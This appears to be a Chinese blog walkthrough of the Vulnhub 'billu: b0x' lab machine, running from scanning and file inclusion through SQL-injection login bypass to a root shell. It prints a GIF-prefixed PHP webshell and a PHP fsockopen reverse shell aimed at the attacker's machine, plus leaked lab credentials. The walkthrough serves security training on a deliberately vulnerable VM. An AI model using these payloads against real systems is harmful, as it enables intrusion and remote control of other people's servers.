---
title: Vulnhub-billu： b0x
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# billu： b0x

> https://www.vulnhub.com/entry/billu-b0x,188/
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`168`
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 18:54 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00011s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.165
    Host is up (0.00040s latency).
    MAC Address: 00:0C:29:6E:AB:A3 (VMware)
    Nmap scan report for 192.168.75.168
    Host is up (0.00017s latency).
    MAC Address: 00:0C:29:0E:1C:A5 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00013s latency).
    MAC Address: 00:50:56:EC:C5:A4 (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.168                   
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 18:56 CST
    Nmap scan report for 192.168.75.168
    Host is up (0.00068s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:0E:1C:A5 (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p22,80 192.168.75.168                        
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 18:56 CST
    Nmap scan report for 192.168.75.168
    Host is up (0.00040s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
    MAC Address: 00:0C:29:0E:1C:A5 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p22,80 192.168.75.168                             
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 18:58 CST
    Nmap scan report for 192.168.75.168
    Host is up (0.00034s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | http-internal-ip-disclosure: 
    |_  Internal IP Leaked: 127.0.1.1
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /test.php: Test page
    |_  /images/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
    MAC Address: 00:0C:29:0E:1C:A5 (VMware)
    ```
    
    优先级 `80` > `22`
    

## web渗透

1. 访问页面 出现 `Show me your SQLI skills`
    
    ![image.png](image%2054.png)
    
2. 所以我们先跟着它的提示走，尝试`sql`注入，这里我尝试了手工注入和`sqlmap`，都无法注入，先不管，先扫目录
3. 扫描目录
    
    ```python
    dirsearch -u 192.168.75.168 -x 403
    //
    [21:54:33] Starting:                                                                                                                                       
    [21:54:43] 200 -  307B  - /add.php                                          
    [21:54:43] 200 -  307B  - /add
    [21:54:55] 200 -    1B  - /c                                                
    [21:55:06] 200 -    3KB - /head                                             
    [21:55:06] 200 -    3KB - /head.php
    [21:55:07] 301 -  249B  - /images  ->  http://192.168.75.168/images/        
    [21:55:07] 200 -  499B  - /images/                                          
    [21:55:07] 200 -   47KB - /in                                               
    [21:55:18] 302 -    2KB - /panel  ->  index.php                             
    [21:55:18] 302 -    2KB - /panel.php  ->  index.php                         
    [21:55:19] 200 -    8KB - /phpmy/                                           
    [21:55:27] 200 -    1B  - /show                                             
    [21:55:32] 200 -   72B  - /test                                             
    [21:55:32] 200 -   72B  - /test.php   
    ```
    
    - `add.php` 是一个上传文件的页面，可能存在文件上传包含等漏洞
    - `images`是存放图片的文件夹，可能上传的文件是存放在此处
        
        有三个文件，文件名为 `luffy_shanks.jpg`,`luffy_shanks.png`,`white_bread.png`
        
    - `in`是 `phpinfo`页面
    - `phpmy/` 是`phpmyadmin`
    - `test`页面，提示加上`file`元素，可以尝试文件包含
    
    优先级 `test` >`add.php` > …
    
4. `test.php`  渗透
    - 进入页面显示 `'file' parameter is empty. Please provide file path in 'file' parameter` 提示我们缺少参数file并加上文件路径
    - 使用`wfuzz`尝试(GET)
        
        ```python
        
        wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.75.168/test?file=FUZZ 
        ```
        
        无结果
        
    - 尝试POST方法
        
        使用`hackerbar`加上`post`参数`file=/etc/passwd` ，下载到了文件`passwd`
        
        ```python
        # passwd文件内容
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/bin/sh
        bin:x:2:2:bin:/bin:/bin/sh
        sys:x:3:3:sys:/dev:/bin/sh
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/bin/sh
        man:x:6:12:man:/var/cache/man:/bin/sh
        lp:x:7:7:lp:/var/spool/lpd:/bin/sh
        mail:x:8:8:mail:/var/mail:/bin/sh
        news:x:9:9:news:/var/spool/news:/bin/sh
        uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
        proxy:x:13:13:proxy:/bin:/bin/sh
        www-data:x:33:33:www-data:/var/www:/bin/sh
        backup:x:34:34:backup:/var/backups:/bin/sh
        list:x:38:38:Mailing List Manager:/var/list:/bin/sh
        irc:x:39:39:ircd:/var/run/ircd:/bin/sh
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
        nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
        libuuid:x:100:101::/var/lib/libuuid:/bin/sh
        syslog:x:101:103::/home/syslog:/bin/false
        mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
        messagebus:x:103:106::/var/run/dbus:/bin/false
        whoopsie:x:104:107::/nonexistent:/bin/false
        landscape:x:105:110::/var/lib/landscape:/bin/false
        sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
        ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
        ```
        
        应该是靶机的`passwd`文件，尝试包含其他文件
        
    - 尝试别的文件是无回显或者是`file not found`
    - 尝试包含了`images`文件夹的图片(`/var/www/images/` `/var/www/` 为默认路径)，发现可以包含，想到一个方法，有没有可能是让我们上传图片马然后让我们去包含
        
        ![image.png](image%2055.png)
        
5. 尝试文件上传
    - 来到`add.php` ,我尝试了上传文件发现都无法上传上去，主要有几个参数不知道有什么用
        
        ![image.png](image%2056.png)
        

## 文件读取

1. 因为`test.php` 可以文件包含，我们可以尝试包含 `add.php`
    
    ```python
    # 包含 file=/var/www/add.php 回显 
    <?php
    echo '<form  method="post" enctype="multipart/form-data">
        Select image to upload:
        <input type="file" name=image>
    	<input type=text name=name value="name">
    	<input type=text name=address value="address">
    	<input type=text name=id value=1337 >
        <input type="submit" value="upload" name="upload">
    </form>';
    ?>
    ```
    
    是一个表单用来上传，但是没有什么信息，继续尝试包含
    
2. `index.html`
    
    获得登录逻辑
    
    ```python
    <?php
    session_start();
    
    include('c.php');
    include('head.php');
    if(@$_SESSION['logged']!=true)
    {
    	$_SESSION['logged']='';
    	
    }
    
    if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
    {
    	
    	echo "you are logged in :)";
    	header('Location: panel.php', true, 302);
    }
    else
    {
    echo '<div align=center style="margin:30px 0px 0px 0px;">
    <font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
    <br><br>
    Show me your SQLI skills <br>
    <form method=post>
    Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
    <input type=submit name=login value="let\'s login">';
    }
    if(isset($_POST['login']))
    {
    	$uname=str_replace('\'','',urldecode($_POST['un']));
    	$pass=str_replace('\'','',urldecode($_POST['ps']));
    	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    	$result = mysqli_query($conn, $run);
    if (mysqli_num_rows($result) > 0) {
    
    $row = mysqli_fetch_assoc($result);
    	   echo "You are allowed<br>";
    	   $_SESSION['logged']=true;
    	   $_SESSION['admin']=$row['username'];
    	   
    	 header('Location: panel.php', true, 302);
       
    }
    else
    {
    	echo "<script>alert('Try again');</script>";
    }
    	
    }
    echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";
    
    ?>
    ```
    
3. `c.php` ,得到数据库账号密码`billu`，`b0x_billu`
    
    ```python
    <?php
    #header( 'Z-Powered-By:its chutiyapa xD' );
    header('X-Frame-Options: SAMEORIGIN');
    header( 'Server:testing only' );
    header( 'X-Powered-By:testing only' );
    
    ini_set( 'session.cookie_httponly', 1 );
    
    $conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
    
    // Check connection
    if (mysqli_connect_errno())
      {
      echo "connection failed ->  " . mysqli_connect_error();
      }
    
    ?>
    ```
    
4. `show.php`
    
    ```python
    <?php
    include('c.php');
    
    if(isset($_POST['continue']))
    {
    	$run='select * from users ';
    	$result = mysqli_query($conn, $run);
    if (mysqli_num_rows($result) > 0) {
    echo "<table width=90% ><tr><td>ID</td><td>User</td><td>Address</td><td>Image</td></tr>";
     while($row = mysqli_fetch_assoc($result)) 
       {
    	   echo '<tr><td>'.$row['id'].'</td><td>'.htmlspecialchars ($row['name'],ENT_COMPAT).'</td><td>'.htmlspecialchars ($row['address'],ENT_COMPAT).'</td><td><img src="uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'" height=90px width=100px></td></tr>';
    }
       echo "</table>";
    }
    }
    
    ?>
    ```
    
    看到内容
    
    ```python
    echo '<tr><td>'.$row['id'].'</td><td>'.htmlspecialchars ($row['name'],ENT_COMPAT).'</td><td>'.htmlspecialchars ($row['address'],ENT_COMPAT).'</td><td><img src="uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'" height=90px width=100px></td></tr>';
    ```
    
    得到路径 `uploaded_images/` 
    

## 文件读取的到的信息

1. 数据库账号密码`billu`，`b0x_billu`
2. 以及路径 `uploaded_images/` 下存在三个文件 `CaptBarbossa.JPG`，`jack.jpg`，`c.JPG`
3. 登录逻辑
    
    ```python
    $uname=str_replace('\'','',urldecode($_POST['un']));
    	$pass=str_replace('\'','',urldecode($_POST['ps']));
    	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    ```
    

## 登录数据库

1. 进入`phpmyadmin`使用得到的账户登录，成功进入
2. 存在`ica_lab`库，还有`auth` `download` `users`三张表
    
    ```python
    # auth 无数据
    
    # download
    id 	image_name 	location
    1 	Marine ford 	images/marine.jpg
    2 	Luffy fourth gear 	images/Gear_Four_luffy.jpg
    3 	Newgate Vs Teach 	images/Newgate_Vs_Teach.jpg
    4 	straw-hat crew 	images/straw_hat_crew.jpg
    5 	Whitebeard luffy ace 	images/Whitebeard_luffy_ace.jpg
    
    # users
    id 	name 	image 	address
    1 	Jack 	jack.jpg 	Jack sparrow, Pirate of the caribbean
    2 	Captain Barbossa 	CaptBarbossa.JPG 	Captain Barbossa, pirate of the caribbean
    ```
    
    可以看到`users`表的参数和我们的`add`页面的参数一模一样
    
    之后我模仿着上传图片依旧不成功，毕竟有了登录逻辑，去尝试注入
    

## SQL注入

1. 前面获得了登录逻辑
    
    ```python
    $uname=str_replace('\'','',urldecode($_POST['un']));
    $pass=str_replace('\'','',urldecode($_POST['ps']));
    $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    ```
    
    只要我们在`pass`和`name`处输入 `or 1 = 1 #\` 即可登录（看的`dalao`的，我没怎么看出来要怎么注入这里）
    
2. 进去后发现内容是之前的`users`表的内容，发现左上角的`Show Users`可以更换为`Add User` （注意页面是`panel.php`）
    
    ![image.png](image%2057.png)
    
3. 现在的思路是准备一张图片马，内容是一句话木马，然后将图片上传上去，最后我们再去包含
4. 准备图片马(一开始我没加文件头，上传失败了，最后加上文件头就成功了)
    
    ```python
    # shell.png
    GIF89a
    <?php eval($_GET['a']); ?>
    ```
    
5. 上传图片，`address`和`user`随便填，上传成功，`/uploaded_images/`下可以看到我们上传`shell.png`了

## 文件包含

1. 在`/uploaded_images/` 下是不能直接包含的，`test.php`我也尝试了不行,所以我们需要寻找别的包含
2. 我们可以注意到`panel.php` 存在包含，抓包看看
    
    ```python
    POST /panel.php HTTP/1.1
    Host: 192.168.75.168
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    Origin: http://192.168.75.168
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.168/panel.php
    Cookie: PHPSESSID=cd9b68ma23evk5m8s7dknreod5
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    load=show&continue=continue
    ```
    
3. 存在`load`参数，我们将它设置为`shell.png`的路径，并且设置get参数a的值`a=system('whoami')`
    
    ```python
    POST /panel.php?a=system('whoami'); HTTP/1.1  //给get参数，执行命令whoami
    Host: 192.168.75.168
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 48
    Origin: http://192.168.75.168
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.168/panel.php
    Cookie: PHPSESSID=cd9b68ma23evk5m8s7dknreod5
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    load=uploaded_images/shell.png&continue=continue //load设置路径
    ```
    
    回显中获得当前用户，www-data
    
    ```python
    GIF89a
    www-data
    ```
    
4. 我们将参数设置为 下面的，进行反弹shell，同时kali开启监听
    
    ```python
    php -r '$sock=fsockopen("x.x.x.x",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
    ```
    
    但是发现触发不了因为我们上传的图片马内容是`<?php eval($_GET['a']); ?>`
    
    ```python
    # 就会变成
    system("php -r '$sock=fsockopen("192.168.75.151",1234);exec("/bin/sh -i <&3 >&3 2>&3");'");
    ```
    
    引号提前闭合了，所以我们需要重新上传一个图片马，内容是`<?php system($_GET['a']); ?>` ,文件名为`shell2.png`
    
5. 继续尝试包含执行反弹shell
    
    ```python
    POST /panel.php?a=php -r "$sock=fsockopen('192.168.75.151',1234);exec('/bin/sh -i <&3 >&3 2>&3');" HTTP/1.1
    Host: 192.168.75.168
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Origin: http://192.168.75.168
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.168/panel.php
    Cookie: PHPSESSID=cd9b68ma23evk5m8s7dknreod5
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    load=uploaded_images/shell2.png&continue=continue
    ```
    
    依旧不成功，将参数设置为url编码试试
    
    ```python
    POST /panel.php?a=php+-r+'$sock%3dfsockopen("192.168.75.151",1234)%3bexec("/bin/bash+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
    Host: 192.168.75.168
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Origin: http://192.168.75.168
    Sec-GPC: 1
    Connection: keep-alive
    Referer: http://192.168.75.168/panel.php
    Cookie: PHPSESSID=cd9b68ma23evk5m8s7dknreod5
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    load=uploaded_images/shell2.png&continue=continue
    ```
    
    反弹shell成功
    

## 提权

1. 查看权限
    
    ```python
    www-data@indishell:/var/www$ whoami
    www-data
    //
    www-data@indishell:/var/www$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    www-data@indishell:/var/www$ uname -a
    Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
    //
    www-data@indishell:/var/www$ find / -perm -u=s -type f 2>/dev/null
    /bin/fusermount
    /bin/ping
    /bin/ping6
    /bin/umount
    /bin/mount
    /bin/su
    /usr/sbin/pppd
    /usr/sbin/uuidd
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/bin/chsh
    /usr/bin/traceroute6.iputils
    /usr/bin/mtr
    /usr/bin/sudo
    /usr/bin/gpasswd
    /usr/bin/at
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/sudoedit
    //
    www-data@indishell:/var/www$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.
    
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    //
    
    ```
    
2. 寻找敏感文件
    
    发现www目录下的`phpmy/config.inc.php`存在数据库的`root`账号密码`root:roottoor`
    
    尝试登陆了数据库，发现存在权限还是密码不对
    
3. `ssh`密码碰撞，碰撞成功….
    
    ```python
    ssh 192.168.75.168
    root@192.168.75.168's password: 
    //
    Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
    
     * Documentation:  https://help.ubuntu.com/
    
      System information as of Mon Oct 28 22:07:24 IST 2024
    
      System load:  0.0               Processes:           107
      Usage of /:   11.9% of 9.61GB   Users logged in:     0
      Memory usage: 17%               IP address for eth0: 192.168.75.168
      Swap usage:   0%
    
      Graph this data and manage this system at:
        https://landscape.canonical.com/
    
    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.
    
    Your Hardware Enablement Stack (HWE) is supported until April 2017.
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    root@indishell:~# 
    
    ```
    

## 彩蛋

`uploaded_images/` 下的三个文件 `CaptBarbossa.JPG`，`jack.jpg`，`c.JPG` 是存在内容的

```python
# CaptBarbossa.JPG
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.print.PageFormat.PMHorizontalRes</key>
	<dict>
		<key>com.apple.print.ticket.creator</key>
		<string>com.apple.printingmanager</string>
		<key>com.apple.print.ticket.itemArray</key>
		<array>
			<dict>
				<key>com.apple.print.PageFormat.PMHorizontalRes</key>
				<real>72</real>
				<key>com.apple.print.ticket.client</key>
				<string>com.apple.printingmanager</string>
				<key>com.apple.print.ticket.modDate</key>
				<date>2005-03-28T22:13:57Z</date>
				<key>com.apple.print.ticket.stateFlag</key>
				<integer>0</integer>
			</dict>
		</array>
	</dict>
	<key>com.apple.print.PageFormat.PMOrientation</key>
	<dict>
		<key>com.apple.print.ticket.creator</key>
		<string>com.apple.printingmanager</string>
		<key>com.apple.print.ticket.itemArray</key>
		<array>
			<dict>
				<key>com.apple.print.PageFormat.PMOrientation</key>
				<integer>1</integer>
				<key>com.apple.print.ticket.client</key>
				<string>com.apple.printingmanager</string>
				<key>com.apple.print.ticket.modDate</key>
				<date>2005-03-28T22:13:57Z</date>
				<key>com.apple.print.ticket.stateFlag</key>
				<integer>0</integer>
			</dict>
		</array>
	</dict>
	<key>com.apple.print.PageFormat.PMScaling</key>
	<dict>
		<key>com.apple.print.ticket.creator</key>
		<string>com.apple.printingmanager</string>
		<key>com.apple.print.ticket.itemArray</key>
		<array>
			<dict>
				<key>com.apple.print.PageFormat.PMScaling</key>
				<real>1</real>
				<key>com.apple.print.ticket.client</key>
				<string>com.apple.printingmanager</string>
				<key>com.apple.print.ticket.modDate</key>
				<date>2005-03-28T22:13:57Z</date>
				<key>com.apple.print.ticket.stateFlag</key>
				<integer>0</integer>
			</dict>
		</array>
	</dict>
	<key>com.apple.print.PageFormat.PMVerticalRes</key>
	<dict>
		<key>com.apple.print.ticket.creator</key>
		<string>com.apple.printingmanager</string>
		<key>com.apple.print.ticket.itemArray</key>
		<array>
			<dict>
				<key>com.apple.print.PageFormat.PMVerticalRes</key>
				<real>72</real>
				<key>com.apple.print.ticket.client</key>
				<string>com.apple.printingmanager</string>
				<key>com.apple.print.ticket.modDate</key>
				<date>2005-03-28T22:13:57Z</date>
				<key>com.apple.print.ticket.stateFlag</key>
				<integer>0</integer>
			</dict>
		</array>
	</dict>
	<key>com.apple.print.PageFormat.PMVerticalScaling</key>
	<dict>
		<key>com.apple.print.ticket.creator</key>
		<string>com.apple.printingmanager</string>
		<key>com.apple.print.ticket.itemArray</key>
		<array>
			<dict>
				<key>com.apple.print.PageFormat.PMVerticalScaling</key>
				<real>1</real>
				<key>com.apple.print.ticket.client</key>
				<string>com.apple.printingmanager</string>
				<key>com.apple.print.ticket.modDate</key>
				<date>2005-03-28T22:13:57Z</date>
				<key>com.apple.print.ticket.stateFlag</key>
				<integer>0</integer>
			</dict>
		</array>
	</dict>
	<key>com.apple.print.subTicket.paper_info_ticket</key>
	<dict>
		<key>com.apple.print.PageFormat.PMAdjustedPageRect</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.printingmanager</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PageFormat.PMAdjustedPageRect</key>
					<array>
						<real>0.0</real>
						<real>0.0</real>
						<real>734</real>
						<real>576</real>
					</array>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.printingmanager</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2007-05-10T17:29:41Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>0</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.PageFormat.PMAdjustedPaperRect</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.printingmanager</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PageFormat.PMAdjustedPaperRect</key>
					<array>
						<real>-18</real>
						<real>-18</real>
						<real>774</real>
						<real>594</real>
					</array>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.printingmanager</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2007-05-10T17:29:41Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>0</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.PaperInfo.PMPaperName</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.print.pm.PostScript</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PaperInfo.PMPaperName</key>
					<string>na-letter</string>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.print.pm.PostScript</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2003-07-01T17:49:36Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>1</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.PaperInfo.PMUnadjustedPageRect</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.print.pm.PostScript</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PaperInfo.PMUnadjustedPageRect</key>
					<array>
						<real>0.0</real>
						<real>0.0</real>
						<real>734</real>
						<real>576</real>
					</array>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.printingmanager</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2005-03-28T22:13:57Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>0</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.PaperInfo.PMUnadjustedPaperRect</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.print.pm.PostScript</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PaperInfo.PMUnadjustedPaperRect</key>
					<array>
						<real>-18</real>
						<real>-18</real>
						<real>774</real>
						<real>594</real>
					</array>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.printingmanager</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2005-03-28T22:13:57Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>0</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.PaperInfo.ppd.PMPaperName</key>
		<dict>
			<key>com.apple.print.ticket.creator</key>
			<string>com.apple.print.pm.PostScript</string>
			<key>com.apple.print.ticket.itemArray</key>
			<array>
				<dict>
					<key>com.apple.print.PaperInfo.ppd.PMPaperName</key>
					<string>US Letter</string>
					<key>com.apple.print.ticket.client</key>
					<string>com.apple.print.pm.PostScript</string>
					<key>com.apple.print.ticket.modDate</key>
					<date>2003-07-01T17:49:36Z</date>
					<key>com.apple.print.ticket.stateFlag</key>
					<integer>1</integer>
				</dict>
			</array>
		</dict>
		<key>com.apple.print.ticket.APIVersion</key>
		<string>00.20</string>
		<key>com.apple.print.ticket.privateLock</key>
		<false/>
		<key>com.apple.print.ticket.type</key>
		<string>com.apple.print.PaperInfoTicket</string>
	</dict>
	<key>com.apple.print.ticket.APIVersion</key>
	<string>00.20</string>
	<key>com.apple.print.ticket.privateLock</key>
	<false/>
	<key>com.apple.print.ticket.type</key>
	<string>com.apple.print.PageFormatTicket</string>
</dict>
</plist>

<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="3.1.1-112">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
            xmlns:exif="http://ns.adobe.com/exif/1.0/">
         <exif:ExposureTime>1/40</exif:ExposureTime>
         <exif:FNumber>28/10</exif:FNumber>
         <exif:ExposureProgram>1</exif:ExposureProgram>
         <exif:ExifVersion>0220</exif:ExifVersion>
         <exif:DateTimeOriginal>2004-03-18T08:16:53-08:00</exif:DateTimeOriginal>
         <exif:DateTimeDigitized>2004-03-18T08:16:53-08:00</exif:DateTimeDigitized>
         <exif:ShutterSpeedValue>352256/65536</exif:ShutterSpeedValue>
         <exif:ApertureValue>196608/65536</exif:ApertureValue>
         <exif:ExposureBiasValue>0/1</exif:ExposureBiasValue>
         <exif:MeteringMode>5</exif:MeteringMode>
         <exif:FocalLength>70/1</exif:FocalLength>
         <exif:FlashpixVersion>0100</exif:FlashpixVersion>
         <exif:ColorSpace>-1</exif:ColorSpace>
         <exif:PixelXDimension>800</exif:PixelXDimension>
         <exif:PixelYDimension>532</exif:PixelYDimension>
         <exif:FocalPlaneXResolution>4064000/1408</exif:FocalPlaneXResolution>
         <exif:FocalPlaneYResolution>2704000/937</exif:FocalPlaneYResolution>
         <exif:FocalPlaneResolutionUnit>2</exif:FocalPlaneResolutionUnit>
         <exif:CustomRendered>0</exif:CustomRendered>
         <exif:ExposureMode>1</exif:ExposureMode>
         <exif:WhiteBalance>1</exif:WhiteBalance>
         <exif:SceneCaptureType>0</exif:SceneCaptureType>
         <exif:ISOSpeedRatings>
            <rdf:Seq>
               <rdf:li>500</rdf:li>
            </rdf:Seq>
         </exif:ISOSpeedRatings>
         <exif:ComponentsConfiguration>
            <rdf:Seq>
               <rdf:li>1</rdf:li>
               <rdf:li>2</rdf:li>
               <rdf:li>3</rdf:li>
               <rdf:li>0</rdf:li>
            </rdf:Seq>
